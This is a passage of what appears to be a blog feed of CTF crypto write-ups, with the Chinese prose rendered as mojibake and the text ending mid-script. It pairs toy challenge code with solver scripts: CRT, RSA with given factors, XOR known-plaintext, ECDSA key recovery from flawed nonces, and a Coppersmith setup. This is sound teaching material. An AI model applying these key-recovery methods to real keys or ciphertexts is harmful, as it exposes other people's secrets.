class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br>u = hashlib.sha256(x).hexdigest()<br><span class="hljs-keyword">assert</span> u[:<span class="hljs-number">5</span>]==<span class="hljs-string">b&#x27;6a651&#x27;</span><br>flag = <span class="hljs-string">b&#x27;SYC&#123;&#x27;</span>+u+<span class="hljs-string">b&#x27;&#125;&#x27;</span><br>c = [x % i  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m]<br><span class="hljs-built_in">print</span>(m)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-comment">#[207867980504656835313307696396607264603, 245036212212570610987366430554968489325, 270836744824069537438646110613439698666, 319275775495422875474878625752594133023, 254268823435329877199449670714528712873, 213093607196415232366564484229844568444, 246921085368773491003187313772615702950]</span><br><span class="hljs-comment">#[150031581047390726903711035932621949276, 21260202376534810598778595491323328519, 144049733622518360270048059408969512643, 236920143187836025924037873968303507493, 99781504248790469459151935530031893836, 69236016568483424294966410179787943383, 20613188366058016717435734248097940419]</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><br>m=[<span class="hljs-number">207867980504656835313307696396607264603</span>, <span class="hljs-number">245036212212570610987366430554968489325</span>, <span class="hljs-number">270836744824069537438646110613439698666</span>, <span class="hljs-number">319275775495422875474878625752594133023</span>, <span class="hljs-number">254268823435329877199449670714528712873</span>, <span class="hljs-number">213093607196415232366564484229844568444</span>, <span class="hljs-number">246921085368773491003187313772615702950</span>]<br>c=[<span class="hljs-number">150031581047390726903711035932621949276</span>, <span class="hljs-number">21260202376534810598778595491323328519</span>, <span class="hljs-number">144049733622518360270048059408969512643</span>, <span class="hljs-number">236920143187836025924037873968303507493</span>, <span class="hljs-number">99781504248790469459151935530031893836</span>, <span class="hljs-number">69236016568483424294966410179787943383</span>, <span class="hljs-number">20613188366058016717435734248097940419</span>]<br>x = crt(c,m)<br><span class="hljs-comment">#print(x)</span><br>l=<span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    l=lcm(l,m[i])<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>    u = x + i*l<br>    u = hashlib.sha256(<span class="hljs-built_in">str</span>(u).encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> u[:<span class="hljs-number">5</span>] == <span class="hljs-string">&#x27;6a651&#x27;</span>:<br>        flag = <span class="hljs-string">b&#x27;SYC&#123;&#x27;</span> + u.encode() + <span class="hljs-string">b&#x27;&#125;&#x27;</span><br>        <span class="hljs-built_in">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, getPrime<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br>p = getPrime(<span class="hljs-number">128</span>)<br>q = getPrime(<span class="hljs-number">128</span>)<br>n = p*q<br>e = <span class="hljs-number">65537</span><br>m = bytes_to_long(flag)<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;n = <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q = <span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;c = <span class="hljs-subst">&#123;c&#125;</span>&quot;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">n = 33108009203593648507706487693709965711774665216872550007309537128959455938833</span><br><span class="hljs-string">p = 192173332221883349384646293941837353967</span><br><span class="hljs-string">q = 172282016556631997385463935089230918399</span><br><span class="hljs-string">c = 5366332878961364744687912786162467698377615956518615197391990327680664213847</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse<br>n = <span class="hljs-number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span><br>p = <span class="hljs-number">192173332221883349384646293941837353967</span><br>q = <span class="hljs-number">172282016556631997385463935089230918399</span><br>c = <span class="hljs-number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span><br>e = <span class="hljs-number">65537</span><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d = inverse(e, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>ans = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure><h1 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><br>key = <span class="hljs-string">b&#x27;...&#x27;</span><br>flag = <span class="hljs-string">b&#x27;...&#x27;</span><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key)==<span class="hljs-number">4</span><br><br>enc = bytes_to_long(xor(flag,key))<br><br>f1 = <span class="hljs-number">4585958212176920650644941909171976689111990</span><br>f2 = <span class="hljs-number">3062959364761961602614252587049328627114908</span><br>e1 = enc^f1<br>e2 = e1^f2<br><span class="hljs-built_in">print</span>(e2)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">10706859949950921239354880312196039515724907</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> xor<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>f1 = <span class="hljs-number">4585958212176920650644941909171976689111990</span><br>f2 = <span class="hljs-number">3062959364761961602614252587049328627114908</span><br><br>e2=<span class="hljs-number">10706859949950921239354880312196039515724907</span><br>e1 = e2^f2<br>enc = e1^f1<br><span class="hljs-comment">#å·²çŸ¥éƒ¨åˆ†æ˜æ–‡</span><br>hint = <span class="hljs-string">b&#x27;SYC&#123;&#x27;</span><br>key = xor(hint,long_to_bytes(enc)[:<span class="hljs-number">4</span>])<br>flag = xor(long_to_bytes(enc),key)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>æå®¢å¤§æŒ‘æˆ˜</tag>
      
      <tag>Geek</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>L3HCTF 2025 WriteUp</title>
    <link href="/2025/07/20/L3HCTF%202025%20WriteUp/"/>
    <url>/2025/07/20/L3HCTF%202025%20WriteUp/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯å¯¹L3HCTF 2025çš„å¤ç°ï¼ŒåŒ…æ‹¬Cryptoå’ŒMISCä¸¤éƒ¨åˆ†ï¼Œè®°å½•äº†å¤§æ¦‚çš„åšé¢˜è¿‡ç¨‹ï¼Œå¦‚æœ‰é—®é¢˜æ¬¢è¿éšæ—¶æå‡ºäº¤æµ(<em>^_^</em>)</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="EzECDSA"><a href="#EzECDSA" class="headerlink" title="EzECDSA"></a>EzECDSA</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> NIST256p, SigningKey<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FlawedNonceGenerator</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        <span class="hljs-variable language_">self</span>.n = n<br>        <span class="hljs-variable language_">self</span>.a = random.randrange(<span class="hljs-number">1</span>, n)<br>        <span class="hljs-variable language_">self</span>.b = random.randrange(<span class="hljs-number">1</span>, n)<br>        <span class="hljs-variable language_">self</span>.c = random.randrange(<span class="hljs-number">1</span>, n)<br>        <span class="hljs-variable language_">self</span>.last_k = random.randrange(<span class="hljs-number">1</span>, n)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_nonce</span>(<span class="hljs-params">self</span>):<br>        current_k = <span class="hljs-variable language_">self</span>.last_k<br>        next_k = (<span class="hljs-variable language_">self</span>.a * current_k**<span class="hljs-number">2</span> + <span class="hljs-variable language_">self</span>.b * current_k + <span class="hljs-variable language_">self</span>.c) % <span class="hljs-variable language_">self</span>.n<br>        <span class="hljs-variable language_">self</span>.last_k = next_k<br>        <br>        <span class="hljs-keyword">return</span> current_k<br><br><br>curve = NIST256p<br>n = curve.order<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Curve order n: <span class="hljs-subst">&#123;n&#125;</span>&quot;</span>)<br>private_key = SigningKey.from_secret_exponent(random.randrange(<span class="hljs-number">1</span>, n), curve=curve)<br>d = private_key.privkey.secret_multiplier<br>public_key = private_key.get_verifying_key()<br><br>messages = [<br>    <span class="hljs-string">b&quot;Hello player, welcome to L3HCTF 2025!&quot;</span>,<br>    <span class="hljs-string">b&quot;This is a crypto challenge, as you can probably tell.&quot;</span>,<br>    <span class="hljs-string">b&quot;It&#x27;s about ECDSA, a very... robust algorithm.&quot;</span>,<br>    <span class="hljs-string">b&quot;I&#x27;m sure there are no implementation flaws whatsoever.&quot;</span>,<br>    <span class="hljs-string">b&quot;Anyway, here are your signatures. Good luck!&quot;</span>,<br>    <span class="hljs-string">f&quot;Oh, and the flag is L3HCTF&#123;&#123;<span class="hljs-subst">&#123;d&#125;</span>&#125;&#125;. Don&#x27;t tell anyone!&quot;</span>.encode(),<br>]<br>nonce_generator = FlawedNonceGenerator(n)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;signatures.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    k = nonce_generator.generate_nonce()<br>    message = messages[i]<br>    h = <span class="hljs-built_in">int</span>.from_bytes(hashlib.sha256(message).digest(), <span class="hljs-string">&#x27;big&#x27;</span>)<br>    R = k * curve.generator<br>    r = R.x() % n<br>    s_inv = <span class="hljs-built_in">pow</span>(k, -<span class="hljs-number">1</span>, n)<br>    s = (s_inv * (h + d * r)) % n<br>    f.write(<span class="hljs-string">f&quot;h: <span class="hljs-subst">&#123;h&#125;</span>, r: <span class="hljs-subst">&#123;r&#125;</span>, s: <span class="hljs-subst">&#123;s&#125;</span>\n&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong> åˆ©ç”¨æ‰€çŸ¥é“çš„å…³ç³»åˆ—æ–¹ç¨‹ç»„ï¼Œä¸€å…±å¯ä»¥åˆ—å‡º12ä¸ªæ–¹ç¨‹ï¼Œæ€»å…±æœ‰11ä¸ªæœªçŸ¥æ•°ï¼Œå› æ­¤å¾ˆæœ‰å¯èƒ½å¯ä»¥ç›´æ¥æ±‚å‡ºdï¼Œæ‰€ä»¥åœ¨sageä¸­æ¶ˆå…ƒå¹¶è§£æ–¹ç¨‹å³å¯ã€‚</p><p><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> NIST256p<br><span class="hljs-keyword">import</span> re<br>n = NIST256p.order<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;signatures.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br><br>hs, rs, ss = [], [], []<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    h = <span class="hljs-built_in">int</span>(re.search(<span class="hljs-string">r&quot;h: (\d+)&quot;</span>, line).group(<span class="hljs-number">1</span>))<br>    r = <span class="hljs-built_in">int</span>(re.search(<span class="hljs-string">r&quot;r: (\d+)&quot;</span>, line).group(<span class="hljs-number">1</span>))<br>    s = <span class="hljs-built_in">int</span>(re.search(<span class="hljs-string">r&quot;s: (\d+)&quot;</span>, line).group(<span class="hljs-number">1</span>))<br>    hs.append(h)<br>    rs.append(r)<br>    ss.append(s)<br><br>R.&lt;k1, k2, k3, k4, k5, k6, a, b, c, d&gt; = PolynomialRing(Zmod(n))<br><br>eqs = [<br>    k2 - (a*k1^<span class="hljs-number">2</span> + b*k1 + c),<br>    k3 - (a*k2^<span class="hljs-number">2</span> + b*k2 + c),<br>    k4 - (a*k3^<span class="hljs-number">2</span> + b*k3 + c),<br>    k5 - (a*k4^<span class="hljs-number">2</span> + b*k4 + c),<br>    k6 - (a*k5^<span class="hljs-number">2</span> + b*k5 + c),<br>    ss[<span class="hljs-number">0</span>]*k1 - (hs[<span class="hljs-number">0</span>] + rs[<span class="hljs-number">0</span>]*d),<br>    ss[<span class="hljs-number">1</span>]*k2 - (hs[<span class="hljs-number">1</span>] + rs[<span class="hljs-number">1</span>]*d),<br>    ss[<span class="hljs-number">2</span>]*k3 - (hs[<span class="hljs-number">2</span>] + rs[<span class="hljs-number">2</span>]*d),<br>    ss[<span class="hljs-number">3</span>]*k4 - (hs[<span class="hljs-number">3</span>] + rs[<span class="hljs-number">3</span>]*d),<br>    ss[<span class="hljs-number">4</span>]*k5 - (hs[<span class="hljs-number">4</span>] + rs[<span class="hljs-number">4</span>]*d),<br>    ss[<span class="hljs-number">5</span>]*k6 - (hs[<span class="hljs-number">5</span>] + rs[<span class="hljs-number">5</span>]*d)<br>]<br><br>I = ideal(eqs)<br>G = I.groebner_basis()<br><span class="hljs-comment">#print(G)</span><br><span class="hljs-keyword">for</span> g <span class="hljs-keyword">in</span> G:<br>    <span class="hljs-keyword">if</span> g.variables() == (d,):<br>        poly = g<br>        <span class="hljs-keyword">break</span><br><br>sols = poly.univariate_polynomial().roots(multiplicities=<span class="hljs-literal">False</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;L3HCTF&#123;&#123;<span class="hljs-subst">&#123;sols&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="math-problem"><a href="#math-problem" class="headerlink" title="math-problem"></a>math-problem</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-keyword">from</span> scret <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myfunction</span>(<span class="hljs-params">num</span>):<br>    output = <span class="hljs-number">0</span><br>    output=num**<span class="hljs-number">3</span><br>    <span class="hljs-keyword">return</span> output<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    flag_len = <span class="hljs-built_in">len</span>(flag)<br>    p, q = getPrime(<span class="hljs-number">512</span>), getPrime(<span class="hljs-number">512</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = getPrime(<span class="hljs-number">512</span>)<br>        R = bytes_to_long(<span class="hljs-built_in">str</span>(r).encode())<br>        <span class="hljs-keyword">if</span> isPrime(R):<br>            <span class="hljs-keyword">break</span><br><br>    n = p * q * r<br>    hint1 = R * r<br>    mod = myfunction(n)<br>    hint2 = <span class="hljs-built_in">pow</span>(<span class="hljs-number">3</span>*n+<span class="hljs-number">1</span>, p % (<span class="hljs-number">2</span> ** <span class="hljs-number">400</span>), mod)<br>    m = bytes_to_long(flag)<br>    c = <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">65537</span>, n)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;All data:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;hint1 = <span class="hljs-subst">&#123;hint1&#125;</span>&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;hint2 = <span class="hljs-subst">&#123;hint2&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">All data:</span><br><span class="hljs-string">n = 1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921</span><br><span class="hljs-string">c = 102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984</span><br><span class="hljs-string">hint1 = 41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333</span><br><span class="hljs-string">hint2 = 10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br><strong>ï¼ˆ1ï¼‰Part1ï¼š</strong><br>$\because n &#x3D; p\cdot q\cdot r,hint1&#x3D;R\cdot r$<br>$\therefore gcd(n,hint1) &#x3D; krï¼Œè¿™é‡Œçš„k&#x3D;1æˆ–pæˆ–qæˆ–pq$<br>$\because å¯ä»¥æŸ¥çœ‹gcd(n,hint1).nbits()&#x3D;512ï¼Œåˆ™k&#x3D;1$<br>$\therefore r&#x3D;gcd(n,hint1)$<br><strong>ï¼ˆ2ï¼‰Part2ï¼š</strong><br>$\because hint2 &#x3D; (3n+1)^{p \mod 2^{400}}\mod n^3ï¼Œè®¾p_{low}&#x3D; p\mod 2^{400}$<br>$\therefore$ ç”±äºŒé¡¹å¼å®šç†å¾—ï¼Œ</p><span>$$hint2 = (_2^{p_{low}})9n^2+(^{p_{low}}_1)3n+1 \mod n^3$$</span><p>$\therefore hint2 &#x3D; \frac{p_{low}\cdot (p_{low}-1)}{2}\cdot 9n^2 + p_{low}\cdot 3n+1\mod n^3$<br>$\therefore hint2 \equiv p_{low}\cdot 3n+1 \mod n^2$<br>$\therefore (hint2-1)&#x2F;&#x2F;n \equiv p_{low}\cdot 3$<br>$\therefore p_{low} \equiv (hint2-1)\cdot 3^{-1}\mod n$<br>ä¹‹ååˆ©ç”¨coppersmithå®šç†<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,inverse<br><br>n = <span class="hljs-number">1031361339208727791691298627543660626410606240120564103678654539403400080866317968868129842196968695881908504164493307869679126969820723174066217814377008485456923379924853652121682069359767219423414060835725846413022799109637665041081215491777412523849107017649039242068964400703052356256244423474207673552341406331476528847104738461329766566162770505123490007005634713729116037657261941371410447717090137275138353217951485412890440960756321099770208574858093921</span><br>c = <span class="hljs-number">102236458296005878146044806702966879940747405722298512433320216536239393890381990624291341014929382445849345903174490221598574856359809965659167404530660264493014761156245994411400111564065685663103513911577275735398329066710295262831185375333970116921093419001584290401132157702732101670324984662104398372071827999099732380917953008348751083912048254277463410132465011554297806390512318512896160903564287060978724650580695287391837481366347198300815022619675984</span><br>hint1 = <span class="hljs-number">41699797470148528118065605288197366862071963783170462567646805693192170424753713903885385414542846725515351517470807154959539734665451498128021839987009088359453952505767502787767811244460427708303466073939179073677508236152266192609771866449943129677399293427414429298810647511172104050713783858789512441818844085646242722591714271359623474775510189704720357600842458800685062043578453094042903696357669390327924676743287819794284636630926065882392099206000580093201362555407712118431477329843371699667742798025599077898845333</span><br>hint2 = <span class="hljs-number">10565371682545827068628214330168936678432017129758459192768614958768416450293677581352009816968059122180962364167183380897064080110800683719854438826424680653506645748730410281261164772551926020079613841220031841169753076600288062149920421974462095373140575810644453412962829711044354434460214948130078789634468559296648856777594230611436313326135647906667484971720387096683685835063221395189609633921668472719627163647225857737284122295085955645299384331967103814148801560724293703790396208078532008033853743619829338796313296528242521122038216263850878753284443416054923259279068894310509509537975210875344702115518307484576582043341455081343814378133782821979252975223992920160189207341869819491668768770230707076868854748648405256689895041414944466320313193195829115278252603228975429163616907186455903997049788262936239949070310119041141829846270634673190618136793047062531806082102640644325030011059428082270352824026797462398349982925951981419189268790800571889709446027925165953065407940787203142846496246938799390975110032101769845148364390897424165932568423505644878118670783346937251004620653142783361686327652304482423795489977844150385264586056799848907</span><br><br>r = gmpy2.gcd(hint1, n)<br>t = n // r<br><br><span class="hljs-comment">#æ¢å¤ p çš„ä½ 400 ä½ k</span><br>inv3 = inverse(<span class="hljs-number">3</span>,n)<br>p_low = ((hint2-<span class="hljs-number">1</span>)//n*inv3) %n<br><br><span class="hljs-comment">#ä½¿ç”¨ Coppersmith æ–¹æ³•æ¢å¤å®Œæ•´çš„ p</span><br>M = <span 